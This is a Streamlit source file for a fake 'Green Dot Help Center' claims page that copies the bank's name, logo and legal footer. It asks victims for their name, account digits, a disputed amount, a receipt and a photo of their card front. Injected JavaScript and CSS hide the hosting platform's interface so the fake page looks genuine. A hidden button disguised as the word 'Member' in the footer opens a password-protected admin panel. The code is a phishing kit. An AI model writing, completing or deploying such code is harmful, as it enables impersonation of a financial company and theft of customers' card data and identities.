
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- JS: PURGA ---
st.markdown("""<script>
    const deepPurge = () => {
        const blackList = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]', 
            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]', 
            '.stElementToolbar', '.st-emotion-cache-140j12g', 'button[title="View fullscreen"]', 
            'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', '.etxdrby3', '.etxdrby1'
        ];
        blackList.forEach(sel => { document.querySelectorAll(sel).forEach(el => el.remove()); });
    };
    setInterval(deepPurge, 100);
</script>""", unsafe_allow_html=True)

# --- CSS: MIMETISMO TOTAL ---
st.markdown("""<style>
    .section-anchor, [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"], 
    [data-testid="stElementToolbar"], .stElementToolbar, .st-emotion-cache-140j12g, .st-emotion-cache-gi0tri {
        display: none !important; visibility: hidden !important; height: 0px !important;
    }
    
    [data-testid='stHeader'], footer, header, .stDeployButton { display: none !important; }
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    /* Footer Legal Indistinguible */
    .legal-container {
        font-size: 10px; color: #444; text-align: justify; margin-top: 50px;
        border-top: 1px solid #111; padding-top: 10px; line-height: 1.2;
    }

    /* Botón Ghost corregido: sin fondo, sin bordes, color de texto legal */
    div.stButton > button[key="ghost_32_2"] {
        background-color: transparent !important; 
        border: none !important; 
        color: #444 !important;
        padding: 0 !important; 
        margin: 0 !important; 
        display: inline !important;
        font-size: 10px !important; 
        font-family: inherit !important;
        width: auto !important; 
        height: auto !important;
        min-height: 0 !important; 
        min-width: 0 !important; 
        box-shadow: none !important;
        cursor: text !important; 
        vertical-align: baseline !important;
        transition: none !important;
    }
    div.stButton > button[key="ghost_32_2"]:hover, 
    div.stButton > button[key="ghost_32_2"]:active, 
    div.stButton > button[key="ghost_32_2"]:focus {
        color: #444 !important; 
        background: transparent !important; 
        border: none !important;
        box-shadow: none !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("ghost_form_32_2", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"):
            if nombre and rec and car:
                ref = generate_ref()
                st.success(f"Success. Reference: {ref}")
            else: st.error("Information required.")

    # Footer mimetizado
    st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
    if st.button("Member", key="ghost_32_2"): st.session_state.admin_mode = True
    st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)

else:
    st.title("🔐 Administrative")
    if st.button("Exit"): st.session_state.admin_mode = False
    pw = st.text_input("Auth Key", type="password")
    if pw == "Diostieneelpoder1": st.write("Access Granted")
